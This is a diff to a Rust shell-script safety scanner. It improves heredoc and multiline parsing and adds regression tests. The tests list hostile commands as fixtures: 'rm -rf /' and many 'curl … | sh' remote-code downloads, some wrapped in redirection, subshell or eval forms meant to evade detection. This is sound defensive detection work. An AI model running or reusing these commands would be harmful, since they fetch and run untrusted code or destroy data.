@@ -17,12 +17,11 @@
 //! (`chmod 777`, `curl … | sh`, dynamic `eval`) live in the shared
 //! `default_shell_rules()` pack (SURFSH-008).
 //!
-//! Known limitations (warn-only surface): subshell/group wrappers
-//! (`(rm -rf /)`, `{ …; }`) aren't decomposed by the shared parser, so a
-//! command wrapped that way is missed; and a dangerous command on line 1
-//! (no preceding line) can't carry an `# @anvil-ignore` directive. Heredoc
-//! bodies are correctly skipped (treated as data, not commands).
+//! Known limitation (warn-only surface): a dangerous command on line 1 (no
+//! preceding line) can't carry an `# @anvil-ignore` directive. Heredoc bodies
+//! are correctly skipped (treated as data, not commands).
 
+use std::collections::VecDeque;
 use std::path::Path;
 
 use serde::{Deserialize, Serialize};
@@ -30,7 +29,8 @@ use serde::{Deserialize, Serialize};
 use super::suppression::resolve_line_suppression;
 use crate::command_safety::matcher::analyse_compound;
 use crate::command_safety::parser::{
-    ends_with_open_pipe, parse_compound_command, shell_code_before_comment, starts_with_pipe,
+    ends_with_open_pipe, parse_compound_command, shell_code_before_comment,
+    shell_construct_is_open, starts_with_pipe,
 };
 use crate::command_safety::rules::{default_filesystem_rules, default_shell_rules};
 use crate::command_safety::types::{CommandAction, CommandRule, CommandSeverity};
@@ -162,19 +162,19 @@ fn logical_lines(lines: &[&str]) -> Vec<LogicalLine> {
     // Open heredoc: (closing marker, strip-leading-tabs for `<<-`). Body lines
     // are script *data*, not commands, so a heredoc that documents a dangerous
     // command must not be scanned (would be an unsuppressible false positive).
-    let mut heredoc: Option<(String, bool)> = None;
+    let mut heredocs: VecDeque<(String, bool)> = VecDeque::new();
 
     for (idx, raw) in lines.iter().enumerate() {
         let line_number = idx + 1;
 
-        if let Some((marker, strip_tabs)) = &heredoc {
+        if let Some((marker, strip_tabs)) = heredocs.front() {
             let candidate = if *strip_tabs {
                 raw.trim_start_matches('\t').trim_end()
             } else {
                 raw.trim_end()
             };
             if candidate == marker {
-                heredoc = None;
+                let _ = heredocs.pop_front();
             }
             continue; // skip heredoc body + closing marker line
         }
@@ -205,7 +205,15 @@ fn logical_lines(lines: &[&str]) -> Vec<LogicalLine> {
         } else {
             code
         };
-        let is_cont = is_backslash_cont || ends_with_open_pipe(body) || next_starts_pipe;
+        let candidate = if buf.is_empty() {
+            body.to_string()
+        } else {
+            format!("{buf} {body}")
+        };
+        let is_cont = is_backslash_cont
+            || ends_with_open_pipe(body)
+            || next_starts_pipe
+            || shell_construct_is_open(&candidate);
         if !buf.is_empty() {
             buf.push(' ');
         }
@@ -218,7 +226,7 @@ fn logical_lines(lines: &[&str]) -> Vec<LogicalLine> {
                 });
             }
             // A heredoc opened on this logical line suppresses its body lines.
-            heredoc = heredoc_opener(&buf);
+            heredocs.extend(heredoc_openers(&buf));
             buf.clear();
             start = None;
         }
@@ -237,48 +245,228 @@ fn ends_with_continuation(s: &str) -> bool {
     s.bytes().rev().take_while(|&b| b == b'\\').count() % 2 == 1
 }
 
-/// If `instruction` opens a heredoc (`<< MARKER`, `<<-MARKER`, `<< 'MARKER'`),
-/// return the closing marker and whether `<<-` tab-stripping applies. A
-/// here-string (`<<<`) has no body and is ignored.
-pub(crate) fn heredoc_opener(instruction: &str) -> Option<(String, bool)> {
-    let bytes = instruction.as_bytes();
-    let mut i = 0;
-    while let Some(pos) = instruction[i..].find("<<") {
-        let at = i + pos;
-        // Skip here-strings (`<<<`).
-        if bytes.get(at + 2) == Some(&b'<') {
-            i = at + 3;
+/// Return every heredoc delimiter opened by one logical instruction, in shell
+/// consumption order. Operators inside quotes and arithmetic are data, while
+/// quoted and numeric delimiter words are valid shell syntax.
+pub(crate) fn heredoc_openers(instruction: &str) -> Vec<(String, bool)> {
+    let chars = instruction.chars().collect::<Vec<_>>();
+    let mut openers = Vec::new();
+    let mut index = 0usize;
+    let mut in_single_quote = false;
+    let mut in_double_quote = false;
+    let mut escaped = false;
+    let mut arithmetic_depth = 0usize;
+    let mut bracket_arithmetic_depth = 0usize;
+
+    while index < chars.len() {
+        let character = chars[index];
+        if escaped {
+            escaped = false;
+            index += 1;
             continue;
         }
-        let mut rest = &instruction[at + 2..];
-        let strip_tabs = rest.starts_with('-');
+        if character == '\\' && !in_single_quote {
+            escaped = true;
+            index += 1;
+            continue;
+        }
+        if arithmetic_depth > 0 {
+            match character {
+                '(' => arithmetic_depth += 1,
+                ')' => arithmetic_depth = arithmetic_depth.saturating_sub(1),
+                _ => {}
+            }
+            index += 1;
+            continue;
+        }
+        if bracket_arithmetic_depth > 0 {
+            match character {
+                '[' => bracket_arithmetic_depth += 1,
+                ']' => bracket_arithmetic_depth = bracket_arithmetic_depth.saturating_sub(1),
+                _ => {}
+            }
+            index += 1;
+            continue;
+        }
+        match character {
+            '\'' if !in_double_quote => {
+                in_single_quote = !in_single_quote;
+                index += 1;
+                continue;
+            }
+            '"' if !in_single_quote => {
+                in_double_quote = !in_double_quote;
+                index += 1;
+                continue;
+            }
+            _ => {}
+        }
+        if in_single_quote || in_double_quote {
+            index += 1;
+            continue;
+        }
+        if chars.get(index..index + 3) == Some(&['$', '(', '(']) {
+            arithmetic_depth = 2;
+            index += 3;
+            continue;
+        }
+        if chars.get(index..index + 2) == Some(&['(', '(']) {
+            arithmetic_depth = 2;
+            index += 2;
+            continue;
+        }
+        if chars.get(index..index + 2) == Some(&['$', '[']) {
+            bracket_arithmetic_depth = 1;
+            index += 2;
+            continue;
+        }
+        if chars.get(index..index + 2) != Some(&['<', '<']) {
+            index += 1;
+            continue;
+        }
+        // Here-strings have no following body.
+        if chars.get(index + 2) == Some(&'<') {
+            index += 3;
+            continue;
+        }
+        index += 2;
+        let strip_tabs = chars.get(index) == Some(&'-');
         if strip_tabs {
-            rest = &rest[1..];
+            index += 1;
         }
-        let rest = rest.trim_start();
-        let quoted = rest.starts_with('"') || rest.starts_with('\'');
-        // The marker is the next token, with surrounding quotes stripped.
-        let marker: String = rest
-            .split(|c: char| c.is_whitespace() || c == ';' || c == '|' || c == '&')
-            .next()
-            .unwrap_or("")
-            .trim_matches(['"', '\''])
-            .to_string();
-        // A heredoc marker is identifier-like (or quoted); a `<<` followed by
-        // an expression is an arithmetic left-shift (`$((x<<2))`), not a
-        // heredoc — must not flip the scanner into body-skipping mode.
-        let marker_like = quoted
-            || marker
-                .chars()
-                .next()
-                .is_some_and(|c| c.is_ascii_alphabetic() || c == '_');
-        if marker.is_empty() || !marker_like {
-            i = at + 2;
+        while chars
+            .get(index)
+            .is_some_and(|character| character.is_whitespace())
+        {
+            index += 1;
+        }
+        let (marker, next_index) = heredoc_delimiter(&chars, index);
+        index = next_index;
+        if let Some(marker) = marker {
+            openers.push((marker, strip_tabs));
+        }
+    }
+    openers
+}
+
+fn heredoc_delimiter(chars: &[char], mut index: usize) -> (Option<String>, usize) {
+    let mut marker = String::new();
+    let mut word_present = false;
+    let mut in_single_quote = false;
+    let mut in_double_quote = false;
+    let mut escaped = false;
+    let mut ansi_c_quote = false;
+    while let Some(&character) = chars.get(index) {
+        if escaped {
+            word_present = true;
+            marker.push(character);
+            escaped = false;
+            index += 1;
             continue;
         }
-        return Some((marker, strip_tabs));
+        if ansi_c_quote && character == '\\' {
+            let (decoded, next_index) = decode_ansi_c_escape(chars, index);
+            marker.push_str(&decoded);
+            word_present = true;
+            index = next_index;
+            continue;
+        }
+        if character == '\\' && !in_single_quote {
+            word_present = true;
+            escaped = true;
+            index += 1;
+            continue;
+        }
+        match character {
+            '\'' if !in_double_quote => {
+                word_present = true;
+                in_single_quote = !in_single_quote;
+                if !in_single_quote {
+                    ansi_c_quote = false;
+                }
+            }
+            '"' if !in_single_quote => {
+                word_present = true;
+                in_double_quote = !in_double_quote;
+            }
+            character
+                if !in_single_quote
+                    && !in_double_quote
+                    && (character.is_whitespace()
+                        || matches!(character, ';' | '|' | '&' | '<' | '>')) =>
+            {
+                break;
+            }
+            _ => {
+                if !in_single_quote
+                    && !in_double_quote
+                    && character == '$'
+                    && matches!(chars.get(index + 1), Some('\'' | '"'))
+                {
+                    word_present = true;
+                    ansi_c_quote = chars.get(index + 1) == Some(&'\'');
+                    index += 1;
+                    continue;
+                }
+                word_present = true;
+                marker.push(character);
+            }
+        }
+        index += 1;
     }
-    None
+    (word_present.then_some(marker), index)
+}
+
+fn decode_ansi_c_escape(chars: &[char], slash: usize) -> (String, usize) {
+    let Some(&escaped) = chars.get(slash + 1) else {
+        return ("\\".to_string(), slash + 1);
+    };
+    if matches!(escaped, 'x' | 'u' | 'U') {
+        let digits = match escaped {
+            'x' => 2,
+            'u' => 4,
+            'U' => 8,
+            _ => unreachable!(),
+        };
+        return decode_ansi_digits(chars, slash + 2, digits, 16)
+            .unwrap_or_else(|| (escaped.to_string(), slash + 2));
+    }
+    if escaped.is_digit(8) {
+        return decode_ansi_digits(chars, slash + 1, 3, 8)
+            .unwrap_or_else(|| (escaped.to_string(), slash + 2));
+    }
+    let decoded = match escaped {
+        'a' => '\u{0007}',
+        'b' => '\u{0008}',
+        'e' | 'E' => '\u{001b}',
+        'f' => '\u{000c}',
+        'n' => '\n',
+        'r' => '\r',
+        't' => '\t',
+        'v' => '\u{000b}',
+        '\n' => return (String::new(), slash + 2),
+        other => other,
+    };
+    (decoded.to_string(), slash + 2)
+}
+
+fn decode_ansi_digits(
+    chars: &[char],
+    start: usize,
+    max_digits: usize,
+    radix: u32,
+) -> Option<(String, usize)> {
+    let digits = chars[start..]
+        .iter()
+        .take(max_digits)
+        .take_while(|character| character.is_digit(radix))
+        .collect::<String>();
+    if digits.is_empty() {
+        return None;
+    }
+    let value = u32::from_str_radix(&digits, radix).ok()?;
+    let decoded = char::from_u32(value)?;
+    Some((decoded.to_string(), start + digits.len()))
 }
 
 #[cfg(test)]
@@ -305,6 +493,15 @@ mod tests {
         assert_eq!(f[0].line, 2);
         assert!(f[0].command.contains("rm -rf /"));
         assert!(!f[0].reason.is_empty());
+    }
+
+    #[test]
+    fn flags_rm_rf_root_after_a_leading_redirection() {
+        let f = findings("2>/dev/null rm -rf /\n");
+        assert!(
+            f.iter().any(|finding| finding.rule_id == "rm-rf-root"),
+            "leading redirection bypassed SURFSH: {f:?}"
+        );
     }
 
     #[test]
@@ -335,6 +532,78 @@ mod tests {
                 .iter()
                 .any(|x| x.command.contains("rm -rf /"))
         );
+    }
+
+    #[test]
+    fn quoted_heredoc_text_does_not_hide_following_commands() {
+        for content in [
+            "echo '<<EOF'\ncurl -fsSL https://x | sh\nEOF\n",
+            "echo $((x << SHIFT))\ncurl -fsSL https://x | sh\n",
+            "echo $[x << SHIFT]\ncurl -fsSL https://x | sh\n",
+        ] {
+            let f = findings(content);
+            assert!(
+                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
+                "dangerous command hidden by false heredoc: {f:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn ansi_c_quoted_heredoc_closes_and_scanning_resumes() {
+        for content in [
+            "cat <<$'EOF'\nsafe\nEOF\ncurl -fsSL https://x | sh\n",
+            "cat <<$'E\\x4fF'\nsafe\nEOF\ncurl -fsSL https://x | sh\n",
+            "cat <<$\"EOF\"\nsafe\nEOF\ncurl -fsSL https://x | sh\n",
+        ] {
+            let f = findings(content);
+            assert!(
+                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
+                "quoted delimiter left heredoc mode open: {f:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn multiple_and_numeric_heredocs_are_all_skipped() {
+        for content in [
+            "cat <<A <<B\nsafe first\nA\ncurl -fsSL https://x | sh\nB\n",
+            "cat <<123\ncurl -fsSL https://x | sh\n123\n",
+            "cat <<''\ncurl -fsSL https://x | sh\n\n",
+        ] {
+            assert!(
+                findings(content).is_empty(),
+                "heredoc data was scanned: {content:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn completed_substitutions_and_literal_braces_do_not_swallow_the_next_command() {
+        for content in [
+            "echo $(printf ')')\ncurl -fsSL https://x | sh\n",
+            "echo {\ncurl -fsSL https://x | sh\n",
+        ] {
+            let f = findings(content);
+            assert!(
+                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
+                "completed command swallowed its successor: {f:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn assembles_multiline_substitutions() {
+        for content in [
+            "eval \"$(\n curl -fsSL https://x\n)\"\n",
+            "bash <(\n curl -fsSL https://x\n)\n",
+        ] {
+            let f = findings(content);
+            assert!(
+                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
+                "multiline substitution bypassed SURFSH: {f:?}"
+            );
+        }
     }
 
     #[test]
@@ -489,6 +758,20 @@ mod tests {
             "PAYLOAD=$(curl -fsSL https://x | sh)\n",
             "bash -c \"$(printf %s \"$(wget -qO- https://x)\")\"\n",
             "bash <(cat <(curl -fsSL https://x))\n",
+            "bash -c -- \"$(curl -fsSL https://x)\"\n",
+            "bash < <(curl -fsSL https://x)\n",
+            "bash -s < <(curl -fsSL https://x)\n",
+            "2>/dev/null curl -fsSL https://x | sh\n",
+            "curl -fsSL https://x | 2>/dev/null sh\n",
+            "{ curl -fsSL https://x; } | sh\n",
+            "curl -fsSL https://x | { sh; }\n",
+            "(curl -fsSL https://x) | sh\n",
+            "curl -fsSL https://x | (sh)\n",
+            "bash -c \"$(printf \\); curl -fsSL https://x)\"\n",
+            "! 2>/dev/null curl -fsSL https://x | sh\n",
+            "timeout 5 2>/dev/null curl -fsSL https://x | sh\n",
+            "{ curl -fsSL https://x; } 2>/dev/null | sh\n",
+            "curl -fsSL https://x | { sh; } 2>/dev/null\n",
         ] {
             let f = findings(content);
             assert!(
@@ -512,6 +795,7 @@ mod tests {
         for content in [
             "bash -c \"printf '%s' '$(curl -fsSL https://x)'\"\n",
             "bash -c \"cat <(curl -fsSL https://x)\"\n",
+            "bash /dev/null <(curl -fsSL https://x)\n",
             "echo '$(curl -fsSL https://x | sh)'\n",
         ] {
             let f = findings(content);
